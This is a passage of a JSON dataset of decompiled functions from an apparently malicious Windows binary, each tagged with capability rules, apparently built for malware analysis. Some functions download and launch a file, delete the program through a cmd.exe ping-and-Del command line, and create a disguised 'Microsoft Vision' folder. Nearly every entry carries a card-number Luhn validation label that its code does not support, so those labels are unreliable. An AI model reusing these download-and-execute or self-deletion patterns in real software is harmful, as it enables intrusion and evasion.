        "decompiled_code": "\nint32_t __cdecl fcn.00401a95(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.00405de9();\n    arg_8h_00 = arg_ch * 0xc + *in_ECX;\n    fcn.0040373f(arg_8h_00);\n    *(arg_8h + 4) = *(arg_8h_00 + 4);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    return arg_8h;\n}\n",
        "token_count": 145
    },
    "00401ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401ad0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = *(param_1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.00401441();\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 80
    },
    "00401afa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401afa(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0x10 + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -4;\n        fcn.00405feb();\n        *puVar1 = 0;\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 125
    },
    "00401b27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401b27(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0x18 + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -6;\n        fcn.00405feb();\n        *puVar1 = 0;\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 126
    },
    "00401b52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401b52(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0xc + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -3;\n        fcn.00405feb();\n        *puVar1 = 0;\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 125
    },
    "00401edd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401edd(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t **in_ECX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    int32_t in_stack_00000008;\n    int32_t in_stack_0000000c;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = in_ECX[2];\n    if (piVar3 < in_ECX[1]) {\n        piVar2 = *in_ECX;\n    }\n    else {\n        piVar5 = (piVar3 + 1U) * in_ECX[3];\n        piVar2 = fcn.00406099();\n        piVar3 = NULL;\n        if (piVar2 == NULL) {\n            piVar2 = NULL;\n        }\n        else {\n            *piVar2 = piVar5;\n            piVar2 = piVar2 + 1;\n        }\n        if (in_ECX[2] != NULL) {\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + piVar2;\n                puVar6 = *in_ECX + iVar4;\n                piVar3 = piVar3 + 1;\n                iVar4 = iVar4 + 0xc;\n                *puVar1 = *puVar6;\n                puVar1[1] = puVar6[1];\n                puVar1[2] = puVar6[2];\n            } while (piVar3 < in_ECX[2]);\n        }\n        piVar3 = in_ECX[2];\n        *in_ECX = piVar2;\n        in_ECX[1] = piVar5;\n    }\n    piVar2 = piVar2 + piVar3 * 3;\n    *piVar2 = arg_8h;\n    piVar2[1] = in_stack_00000008;\n    piVar2[2] = in_stack_0000000c;\n    in_ECX[2] = in_ECX[2] + 1;\n    return;\n}\n",
        "token_count": 481
    },
    "00402028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402028(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **in_ECX;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (in_ECX[1] <= in_ECX[2]) {\n        piVar4 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar2 = fcn.00406099();\n        if (piVar2 == NULL) {\n            piVar2 = NULL;\n        }\n        else {\n            *piVar2 = piVar4;\n            piVar2 = piVar2 + 1;\n            piVar1 = piVar2;\n            for (piVar3 = piVar4; piVar3 != NULL; piVar3 = piVar3 + -1) {\n                *piVar1 = 0;\n                piVar1[1] = 0;\n                piVar1[2] = 0;\n                piVar1 = piVar1 + 4;\n            }\n        }\n        piVar3 = NULL;\n        if (in_ECX[2] != NULL) {\n            var_4h = 0;\n            do {\n                fcn.00402137(*in_ECX + var_4h);\n                piVar3 = piVar3 + 1;\n                var_4h = var_4h + 0x10;\n            } while (piVar3 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401ad0();\n        }\n        *in_ECX = piVar2;\n        in_ECX[1] = piVar4;\n    }\n    fcn.00402137(&arg_8h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00401441();\n    return;\n}\n",
        "token_count": 442
    },
    "0040216d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040216d(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00406099();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1[1] = 0;\n            piVar1[2] = 0;\n            piVar1 = piVar1 + 4;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 206
    },
    "004021c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004021c1(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    \n    fcn.00405de9();\n    fcn.00401ff2(arg_ch * 0x10 + *in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 72
    },
    "0040221a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040221a(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_ECX[1] <= in_ECX[2]) {\n        piVar2 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00406099();\n        if (piVar1 == NULL) {\n            piVar1 = NULL;\n        }\n        else {\n            *piVar1 = piVar2;\n            piVar1 = piVar1 + 1;\n            piVar4 = piVar2;\n            piVar3 = piVar1;\n            if (piVar2 != NULL) {\n                for (; piVar4 != NULL; piVar4 = piVar4 + -1) {\n                    *piVar3 = 0;\n                    piVar3 = piVar3 + 1;\n                }\n            }\n        }\n        piVar4 = NULL;\n        if (in_ECX[2] != NULL) {\n            do {\n                fcn.00403549(*in_ECX + piVar4);\n                piVar4 = piVar4 + 1;\n            } while (piVar4 < in_ECX[2]);\n        }\n        piVar4 = *in_ECX;\n        if (piVar4 != NULL) {\n            iVar5 = piVar4[-1];\n            piVar4 = piVar4 + iVar5;\n            for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n                piVar4 = piVar4 + -1;\n                fcn.00405feb();\n                *piVar4 = 0;\n            }\n        }\n        *in_ECX = piVar1;\n        in_ECX[1] = piVar2;\n    }\n    fcn.00403549(&arg_8h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 484
    },
    "0040241a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040241a(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    \n    fcn.00405de9();\n    fcn.00412018(arg_ch * 0x30 + *in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 71
    },
    "0040290e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "download URL",
            "receive data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040290e(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint lpFile;\n    \n    fcn.00410c8a();\n    uVar1 = fcn.004035b9();\n    fcn.0040357c(0x4176a4);\n    fcn.00403447(uVar1);\n    fcn.00405feb();\n    iVar3 = arg_8h + 4;\n    fcn.0040373f(iVar3);\n    uVar1 = fcn.0040362f(&arg_8h);\n    fcn.00403447(uVar1);\n    fcn.00405feb();\n    arg_8h = 0;\n    fcn.00405feb();\n    uVar1 = lpFile;\n    fcn.0040373f(iVar3);\n    iVar3 = (*_sym.imp.urlmon.dll_URLDownloadToFileW)(0, arg_8h, uVar1, 0, 0);\n    fcn.00405feb();\n    if (iVar3 == 0) {\n        uVar2 = (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x4176a8, lpFile, 0, 0, 5);\n        var_ch = 2;\n        if (0x20 < uVar2) {\n            var_ch = 0;\n        }\n    }\n    else {\n        var_ch = 1;\n    }\n    var_10h = 0x417810;\n    fcn.00405044(&var_10h);\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 385
    },
    "00402a9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402a9c(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint lpCommandLine;\n    uint var_32dh;\n    uint lpFilename;\n    uint var_58h;\n    uint var_14h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    fcn.004124d7();\n    if (*(param_2 + 0x68) != 0) {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*0x559cb4, 0);\n    }\n    if (*(param_2 + 0x50) != 0) {\n        fcn.00412612(*(param_2 + 8), param_2 + 0x14, 0x20006, 0);\n        uVar2 = fcn.004036f7(L\"Load\");\n        fcn.004124f2(uVar2);\n        fcn.00405feb();\n        fcn.00412554();\n    }\n    fcn.00401052(&var_58h, 0, 0x44);\n    var_14h = 0;\n    var_10h = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x104);\n    fcn.0040102c(&lpCommandLine, \"cmd.exe /C ping 1.2.3.4 -n 2 -w 1000 > Nul & Del /f /q \", 0x37);\n    fcn.0040102c(&var_32dh, 0x41a0ec, 1);\n    uVar2 = fcn.00401133(&lpFilename);\n    fcn.0040102c(&var_32dh + 1, &lpFilename, uVar2);\n    iVar3 = fcn.00401133(&lpFilename);\n    fcn.0040102c(&var_32dh + iVar3 + 1, 0x41a0ec, 2);\n    (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &lpCommandLine, 0, 0, 0, 0x8000000, 0, 0, &var_58h, &var_14h);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(var_10h);\n    (*pcVar1)(var_14h);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 621
    },
    "00402c31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402c31(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint arg_8h;\n    uint *arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    arg_8h = 0;\n    (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n    param_2 = param_2 + 4;\n    iVar1 = param_2;\n    uVar2 = extraout_ECX;\n    fcn.0040373f(param_2);\n    iVar1 = fcn.0041142a(iVar1);\n    if (iVar1 == 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)(uVar2);\n    }\n    else {\n        fcn.0040373f(param_2);\n        arg_8h_00 = &var_4h;\n        uVar2 = extraout_ECX_00;\n        fcn.0040373f(arg_8h_00);\n        fcn.00403b35(arg_8h_00);\n        fcn.00405feb(arg_8h_00, uVar2);\n        fcn.00403b1e();\n    }\n    fcn.0040373f(param_2);\n    uVar2 = fcn.00404098(arg_8h, param_2);\n    fcn.00405044(uVar2);\n    fcn.00404081();\n    return;\n}\n",
        "token_count": 359
    },
    "00402dc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402dc9(void)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    uint *arg_8h_00;\n    uint var_24h;\n    int32_t var_10h;\n    \n    fcn.004122ca();\n    arg_8h_00 = &var_10h;\n    fcn.0040136c(arg_8h_00);\n    arg_8h = fcn.0040472d(arg_8h_00);\n    fcn.00405044(arg_8h);\n    fcn.004046f1();\n    if (var_10h != 0) {\n        for (iVar1 = *(var_10h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00401468();\n        }\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "00402e27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create directory",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402e27(uint param_1, int32_t param_2)\n\n{\n    uint arg_30h;\n    uint arg_1ch;\n    uint arg_18h;\n    uint arg_14h;\n    uint uVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint noname_1;\n    uint arg_10h;\n    uint arg_20h;\n    uint arg_24h;\n    uint arg_28h;\n    uint arg_2ch;\n    uint lpPathName;\n    uint lpFilename;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.00410e5e();\n    fcn.00410d2d();\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x104);\n    var_ch = 0;\n    fcn.004134a2();\n    var_8h = 0;\n    fcn.00413279(0x10ad, &var_8h);\n    fcn.004036f7(var_10h);\n    uVar1 = extraout_ECX;\n    fcn.004036f7(var_14h);\n    arg_30h = fcn.00410f3e(var_14h, uVar1);\n    arg_24h = 0x417668;\n    arg_28h = extraout_ECX_00;\n    arg_2ch = var_8h;\n    fcn.004036f7(0x417668);\n    arg_20h = extraout_ECX_01;\n    fcn.0041119d();\n    arg_1ch = fcn.00411177();\n    arg_18h = fcn.0041111b();\n    arg_14h = fcn.00410f61();\n    arg_10h = 0x10e;\n    uVar1 = extraout_ECX_02;\n    noname_1 = extraout_ECX_02;\n    fcn.004111d7();\n    uVar1 = fcn.0040430e(uVar1, noname_1, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch, \n                         arg_30h, var_14h);\n    fcn.00405044(uVar1);\n    fcn.004042cc();\n    if (*(param_2 + 0x34) != 0) {\n        fcn.00401052(&lpPathName, 0, 0x208);\n        (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &lpPathName);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpPathName, L\"\\\\Microsoft Vision\\\\\");\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(&lpPathName, 0);\n        fcn.0040906f(param_1, 1);\n        var_8h = 0x41a8b0;\n        fcn.00405044(&var_8h);\n    }\n    fcn.00405feb();\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 760
    },
    "00402f87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00402f87(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00406045();\n    fcn.00406056(arg_10h);\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    fcn.004030cc(arg_8h_00, arg_10h);\n    fcn.00406034();\n    return arg_8h;\n}\n",
        "token_count": 124
    },
    "00402fce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402fce(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if (*(arg_8h + 4) != 0) {\n        uVar1 = fcn.00406045();\n        *in_ECX = uVar1;\n        fcn.00406056(*(arg_8h + 4));\n        in_ECX[1] = *(arg_8h + 4);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "0040300a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040300a(uint arg_8h)\n\n{\n    int32_t lpString2;\n    int32_t in_ECX;\n    \n    lpString2 = fcn.00401085(*(in_ECX + 4) * 2 + 2);\n    fcn.00406077(*(in_ECX + 4) + 2);\n    fcn.00406056(*(in_ECX + 4));\n    fcn.004036f7(lpString2);\n    if (lpString2 != 0) {\n        fcn.00401099(lpString2);\n    }\n    return arg_8h;\n}\n",
        "token_count": 139
    },
    "0040305d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040305d(uint arg_8h)\n\n{\n    int32_t lpString2;\n    int32_t in_ECX;\n    \n    lpString2 = fcn.00401085(*(in_ECX + 4) + 1);\n    fcn.00406077(*(in_ECX + 4) + 1);\n    fcn.00406056(*(in_ECX + 4));\n    fcn.004034d1(lpString2);\n    if (lpString2 != 0) {\n        fcn.00401099(lpString2);\n    }\n    return arg_8h;\n}\n",
        "token_count": 136
    },
    "004030cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004030cc(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    uVar1 = fcn.0040600b();\n    *in_ECX = uVar1;\n    fcn.00406056(arg_ch);\n    in_ECX[1] = in_ECX[1] + arg_ch;\n    return;\n}\n",
        "token_count": 92
    },
    "0040315e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040315e(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    uVar1 = fcn.00406045();\n    *in_ECX = uVar1;\n    fcn.00406056(*(arg_8h + 4));\n    in_ECX[1] = *(arg_8h + 4);\n    return;\n}\n",
        "token_count": 93
    },
    "004031af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004031af(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_ECX;\n    uint var_4h;\n    \n    *arg_8h = 0;\n    iVar1 = fcn.0040319e();\n    if (0 < iVar1) {\n        iVar1 = fcn.0040319e(0, 0);\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 2, *in_ECX, iVar1 + 2);\n        uVar2 = fcn.00405f68();\n        fcn.0040319e();\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0xfde9, 0, *in_ECX, 0xffffffff, uVar2, iVar1 * 2);\n        uVar2 = fcn.004036f7(uVar2);\n        fcn.00403549(uVar2);\n        fcn.00405feb();\n        fcn.00405feb();\n    }\n    return arg_8h;\n}\n",
        "token_count": 248
    },
    "0040329c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040329c(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.0040319e();\n    fcn.0040319e();\n    uVar1 = fcn.00405f8c();\n    *in_ECX = uVar1;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(uVar1, *arg_8h);\n    return;\n}\n",
        "token_count": 103
    },
    "004032e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query environment variable"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004032e6(uint param_1, uint *param_2)\n\n{\n    uint lpDst;\n    \n    fcn.00401052(&lpDst, 0, 0x400);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(*param_2, &lpDst, 0x1ff);\n    fcn.004036f7(&lpDst);\n    return param_1;\n}\n",
        "token_count": 96
    },
    "00403384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403384(uint arg_8h)\n\n{\n    uint ARG_0;\n    \n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x4176c4, arg_8h);\n    fcn.004036f7(&ARG_0);\n    fcn.00403447(&arg_8h);\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 92
    },
    "00403447": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403447(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.00403373();\n    fcn.00403373();\n    uVar1 = fcn.00405f8c();\n    *in_ECX = uVar1;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(uVar1, *arg_8h);\n    return;\n}\n",
        "token_count": 100
    },
    "004035b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004035b9(uint *param_1, int32_t param_2)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint var_34h;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    *param_1 = 0;\n    var_8h = param_1;\n    var_4h = param_2;\n    arg_8h = fcn.00401085(param_2);\n    fcn.00401052(arg_8h, 0, param_2);\n    puVar2 = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJK...\";\n    puVar4 = &var_34h;\n    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar2;\n    uVar5 = 0;\n    uVar3 = var_4h - 1;\n    if (uVar3 != 0) {\n        do {\n            iVar1 = fcn.004010b7();\n            *(uVar5 + arg_8h) = *(&var_34h + iVar1 % 0x28);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar3);\n    }\n    *(arg_8h + uVar3) = 0;\n    fcn.004033d1(arg_8h);\n    fcn.00401099(arg_8h);\n    return var_8h;\n}\n",
        "token_count": 403
    },
    "004038e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004038e9(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00413441(**arg_8h);\n    fcn.00403549(arg_8h_00);\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 75
    },
    "00403925": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403925(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00413441(**arg_8h);\n    fcn.00403549(arg_8h_00);\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 74
    },
    "0040398f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040398f(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = fcn.00413441(*(*arg_8h + 4));\n    fcn.00403549(arg_8h_00);\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 105
    },
    "004039ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004039ea(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = fcn.00413441(*(*arg_8h + 4));\n    fcn.00403549(arg_8h_00);\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 104
    },
    "00403a8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403a8f(uint *param_1)\n\n{\n    *param_1 = 0x417728;\n    if (param_1[3] != 0) {\n        fcn.00406034();\n    }\n    param_1[3] = 0;\n    return;\n}\n",
        "token_count": 70
    },
    "00403ae2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403ae2(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00413441(**arg_8h);\n    fcn.00403549(arg_8h_00);\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 75
    },
    "00403c13": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403c13(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = fcn.00413441(*(*arg_8h + 4));\n    fcn.00403549(arg_8h_00);\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 105
    },
    "00403d2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403d2f(uint *param_1)\n\n{\n    *param_1 = 0x417790;\n    if (param_1[3] != 0) {\n        fcn.00406034();\n    }\n    param_1[3] = 0;\n    return;\n}\n",
        "token_count": 70
    },
    "00403d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d5c(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.00413441(**arg_8h);\n    arg_8h_00 = fcn.00403666(&var_4h);\n    fcn.00403237(arg_8h_00);\n    fcn.00405feb();\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 104
    },
    "00403e39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e39(int32_t *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = *(*arg_8h + 4);\n    uVar1 = fcn.00413441(arg_8h_00);\n    fcn.00403549(uVar1);\n    fcn.00405feb();\n    *(in_ECX + 0x10) = *(arg_8h_00 + 8 + *arg_8h);\n    *(in_ECX + 0xc) = *(arg_8h_00 + 0xc + *arg_8h);\n    uVar1 = fcn.00402f87(&var_8h, arg_8h_00 + 0x14, *(arg_8h_00 + 0x10 + *arg_8h));\n    fcn.00402fce(uVar1);\n    fcn.00403148();\n    return;\n}\n",
        "token_count": 254
    },
    "00403fba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
